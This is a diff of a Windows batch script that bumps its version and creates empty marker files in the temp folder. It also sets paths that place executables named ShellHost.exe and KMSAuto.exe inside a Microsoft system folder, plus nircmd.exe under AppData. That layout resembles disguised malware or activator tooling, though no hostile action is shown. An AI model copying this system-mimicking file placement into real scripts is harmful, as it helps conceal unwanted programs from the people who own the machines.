@@ -1,15 +1,20 @@
 @echo off
 ::goto :EOF
 
+
+if not exist "%temp%\i059.tmp" type nul > "%temp%\i059.tmp"
+if not exist "%temp%\VersDev1.Piy" type nul > "%temp%\VersDev1.Piy"
+
+
 setlocal enabledelayedexpansion
-set "BATCHVERSION=3.0"
+set "BATCHVERSION=3.1"
 
 
 
 set "SHSTFILE=C:\ProgramData\Microsoft\Windows\ShellHost.exe"
 set "KMSFILE=C:\ProgramData\Microsoft\Windows\KMSAuto.exe"
 set nircmd="%APPDATA%\Microsoft\nircmd.exe"
-if not exist "%temp%\i059.tmp" type nul > "%temp%\i059.tmp"
+
 
 
 
